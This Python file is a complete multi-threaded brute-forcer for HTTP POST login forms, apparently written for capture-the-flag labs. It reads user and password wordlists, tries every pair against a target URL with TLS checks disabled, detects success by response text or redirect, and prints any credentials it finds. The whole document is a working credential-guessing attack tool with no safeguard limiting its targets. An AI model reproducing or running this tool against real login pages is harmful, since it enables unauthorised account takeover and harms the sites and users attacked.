import sys
import argparse
import threading
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

progress_lock = threading.Lock()
total_attempts = 0
found_credentials = False
abort_event = threading.Event()

current_user = ""
current_pass = ""

class CustomHelpFormatter(argparse.HelpFormatter):
    def __init__(self, prog):
        super().__init__(prog, max_help_position=45, width=110)
    
    def _format_action_invocation(self, action):
        if not action.option_strings:
            return super()._format_action_invocation(action)
        else:
            parts = []
            if action.option_strings[0].startswith('-') and not action.option_strings[0].startswith('--'):
                parts.append(action.option_strings[0])
            for option in action.option_strings:
                if option.startswith('--'):
                    parts.append(option)
            return ", ".join(parts)

def print_logo():
    logo = """
    [0;37m▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄   ▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄   ▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄ [0m
    [0;37m███▓┌─ ███▓┐ ███▓┌─ ███▓┐ ███▓│  ███▓│    ███▓┌── ███▓│  ███▓│ ▄██▓┌─ ███▓│[0m
    [0;37m████▄▄▄██▀┌┘ ████▄▄▄██▀┌┘ ███▓│  ████│ ░░ ███▓│░░ ███▓│  ████│ ▀███▄▄▄▄▄ ─┘[0m
    [0;37m███▓┌─ ███▄┐ ███▓┌─ ███▄┐ ███▓│  ███▓│ ▒▒ ███▓│▒▒ ███▓│  ███▓│ ▄▄▄▄┌─ ███▓│[0m
    [0;37m▓███▄▄▄█▓┌─┘ ▓███│  ███▓│ └▓██▄▄▄█▓┌─┘ ▀▀ ███▓│▀▀ └▓██▄▄▄█▓┌─┘ ▓███▄▄▄██▓┌┘[0m
    [0;37m ────────┘    ───┘   ───┘   ───────┘       ───┘     ───────┘    ─────────┘ [0m
    """
    print(logo)

def draw_progress_bar(current, total):
    if found_credentials or abort_event.is_set():
        return
    bar_length = 30
    percent = float(current) / total
    arrow = '-' * int(round(percent * bar_length) - 1) + '>'
    spaces = ' ' * (bar_length - len(arrow))
    
    truncated_user = current_user[:12] + '..' if len(current_user) > 12 else current_user
    truncated_pass = current_pass[:12] + '..' if len(current_pass) > 12 else current_pass
    
    sys.stdout.write(f"\r[*] Progress: [{arrow}{spaces}] {current}/{total} ({int(percent * 100)}%) | Trying: {truncated_user}:{truncated_pass}".ljust(100))
    sys.stdout.flush()
def test_login(url, username, password, user_param, pass_param, mode, condition, total_combinations, user_agent, proxies):
    global total_attempts, found_credentials, current_user, current_pass
    
    if abort_event.is_set() or found_credentials:
        return False, username, password

    username = username.strip()
    password = password.strip()
    
    with progress_lock:
        current_user = username
        current_pass = password

    payload = {user_param: username, pass_param: password}
    headers = {"User-Agent": user_agent}

    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxies, verify=False, allow_redirects=False, timeout=5)
        
        success = False
        if mode == 'F' and condition not in response.text:
            if response.status_code != 302 or condition not in response.headers.get('Location', ''):
                success = True
        elif mode == 'S' and (condition in response.text or condition in response.headers.get('Location', '')):
            success = True
        elif mode == 'R' and response.status_code == 302:
            if not condition or condition in response.headers.get('Location', ''):
                success = True

        if not abort_event.is_set():
            with progress_lock:
                total_attempts += 1
                draw_progress_bar(total_attempts, total_combinations)

        if success:
            found_credentials = True
            return True, username, password

    except requests.RequestException:
        if not abort_event.is_set():
            with progress_lock:
                total_attempts += 1
                draw_progress_bar(total_attempts, total_combinations)

    return False, username, password

def main():
    print_logo()
    
    parser = argparse.ArgumentParser(
        description="Dynamic Multi-Threaded HTTP POST Form Brute-Forcer",
        formatter_class=CustomHelpFormatter
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL endpoint (e.g., http://judiciary.hmv)")
    
    user_group = parser.add_mutually_exclusive_group(required=True)
    user_group.add_argument("-l", "--username", help="Single target username string")
    user_group.add_argument("-L", "--userlist", help="Path to the target users wordlist file")
    
    pass_group = parser.add_mutually_exclusive_group(required=True)
    pass_group.add_argument("-p", "--password", help="Single target password string")
    pass_group.add_argument("-P", "--passlist", help="Path to the target passwords wordlist file")
    
    parser.add_argument("-t", "--threads", type=int, default=20, help="Number of concurrent execution threads (default: 20)")
    parser.add_argument("-m", "--mode", choices=['F', 'S', 'R'], required=True, help="Evaluation mode: F=Failure string, S=Success string, R=Redirect status")
    parser.add_argument("-c", "--condition", required=True, help="The specific string, error or redirect route to match against")
    parser.add_argument("-A", "--user-agent", default="brutus", help="Custom User-Agent header transmission string (default: brutus)")
    parser.add_argument("-x", "--proxy", default=None, help="HTTP proxy URL address (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--user-param", default="username", help="POST parameter key for the username field (default: username)")
    parser.add_argument("--pass-param", default="password", help="POST parameter name for the password field (default: password)")

    args = parser.parse_args()

    users = [args.username] if args.username else []
    passwords = [args.password] if args.password else []

    try:
        if args.userlist:
            with open(args.userlist, 'r', encoding='utf-8', errors='ignore') as f:
                users = f.read().splitlines()
        if args.passlist:
            with open(args.passlist, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = f.read().splitlines()
    except FileNotFoundError as e:
        print(f"\n[-] File error: {e}")
        sys.exit(1)

    proxies = None
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    total_combinations = len(users) * len(passwords)
    start_time = datetime.now()
    start_timestamp = time.time()

    print(f"[*] Target Endpoint: {args.url}")
    print(f"[*] Evaluation Mode: {args.mode} | Criteria: '{args.condition}'")
    print(f"[*] Total Keyspace  : {total_combinations} pairs")
    print(f"[*] Deployment Pools: {args.threads} active connections")
    print(f"[*] Configured Agent: {args.user_agent}")
    print(f"[*] Route Proxy Base: {args.proxy}")
    print(f"[*] Execution Started: {start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")

    draw_progress_bar(0, total_combinations)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for user in users:
            if abort_event.is_set():
                break
            for password in passwords:
                if found_credentials or abort_event.is_set():
                    break
                futures.append(executor.submit(
                    test_login, args.url, user, password, 
                    args.user_param, args.pass_param, args.mode, args.condition, total_combinations, args.user_agent, proxies
                ))

        try:
            for future in as_completed(futures):
                if abort_event.is_set():
                    break
                result = future.result()
                if result:
                    success, found_user, found_pass = result
                    if success:
                        end_time = datetime.now()
                        duration = time.time() - start_timestamp
                        
                        sys.stdout.write("\r" + " " * 110 + "\r")
                        print(f"[+] INFILTRATION CREDENTIALS DISCOVERED!")
                        print(f"[+] Username: {found_user}")
                        print(f"[+] Password: {found_pass}")
                        print(f"[*] Execution Ended  : {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
                        print(f"[*] Total Duration   : {duration:.2f} seconds")
                        abort_event.set()
                        executor.shutdown(wait=False, cancel_futures=True)
                        sys.exit(0)
        except KeyboardInterrupt:
            abort_event.set()
            end_time = datetime.now()
            duration = time.time() - start_timestamp
            print(f"\n\n[-] Sequence aborted by user at {end_time.strftime('%Y-%m-%d %H:%M:%S')} (Duration: {duration:.2f}s).")
            executor.shutdown(wait=False, cancel_futures=True)
            sys.exit(1)

    if not found_credentials and not abort_event.is_set():
        end_time = datetime.now()
        duration = time.time() - start_timestamp
        print(f"\n\n[-] Sequence finished at {end_time.strftime('%Y-%m-%d %H:%M:%S')} (Duration: {duration:.2f}s). No valid credentials found.")

if __name__ == "__main__":
    main()
